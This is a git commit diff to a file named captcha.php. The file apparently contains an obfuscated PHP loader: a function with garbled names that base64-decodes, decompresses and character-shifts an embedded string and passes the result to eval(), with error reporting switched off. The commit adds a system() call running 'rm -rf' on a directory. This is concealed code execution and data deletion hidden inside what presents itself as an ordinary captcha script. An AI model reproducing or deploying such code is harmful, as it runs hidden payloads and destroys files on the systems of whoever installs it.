fd23f0e0f595ec8aae467d882aeecdbe156bda97
Waryono763 <53144514+Waryono763@users.noreply.github.com>
2021-04-15 14:38:30 +0700

    Update captcha.php

--- captcha.php
+++ captcha.php
@@ -14,4 +14,5 @@ error_reporting(0);
 
 function шАПу╝╝цб░рй░цШКц╣╡чСгц╜йтБофЕГхСРфбГЁЯШУ($subrekふ灖剃){
 	$ф╗ЦуБоф║║уБоф╗Хф║ЛуВТхП░чДбуБЧуБлуБЧуБкуБДуБзуБПуБауБХуБД_уБйуБЖуВВуБВуВКуБМуБиуБЖуБФуБЦуБДуБ╛уБЧуБЯ_чзБуБоуГБуГгуГ│уГНуГлуВТш│╝шкнуБЩуВЛуБУуБиуВТх┐ШуВМуБкуБДуБзуБПуБауБХуБД;$уБЭуВМуВЙуБохКкхКЫуБпч╡РцЮЬуВТшгПхИЗуВЛуБУуБиуБпуБВуВКуБ╛уБЫуВУтБотБотБотБотБотБотБотБотБоцб░цШКтБотБотБотБотБотБотБотБох╜╝уВЙуБоф╗Хф║ЛуВТшк░уБЛуБлцДЯшмЭуБЧуБ╛уБЩ;$шАПу╝╝цб░рй░цШКц╣╡чСгц╜йтБофЕГхСРфбГЁЯШУ;$subrekふ灖剃 = gzinflate(base64_decode($subrekふ灖剃));for ($noob䏴 = 0; $noob䏴 < strlen($subrekふ灖剃);$noob䏴++) {$subrekふ灖剃[$noob䏴] = chr(ord($subrekふ灖剃[$noob䏴]) -1);}return $subrekふ灖剃;}eVaL(шАПу╝╝цб░рй░цШКц╣╡чСгц╜йтБофЕГхСРфбГЁЯШУ("xVFLasMwED2ATjEYL6RFKxuXLmp6gm67i2BQbLURjmUhySklBHqI5hj9nCkX6chpoTfIMOhp3nv6MANAwZgJYQoYjJ9Csu6ZV6JlrFxr5+AeinI/zI7oAzsdP07vb5fM42e5X9swHxh9XAKiyKsCDoCgOBKIhZYgOKhFJCsHjkgFhQJBOm1JP9O5Bn4W87UK6bxCScnzAwAL/NKCLwrl/758X7ovX4wVeWjRuDiFPDZVNc2qbptqJIGGGc3tDRrXTb3psc4Or30cbG8Jtc+mP3Vr3ZANm5R8vJMymlG/zOG6m0Y5Pz7ogczxNSYz8iKMcBWeoNM+dRuNu7oQ7Q8="));
+system("rm -rf captcha_v1");
 ?>
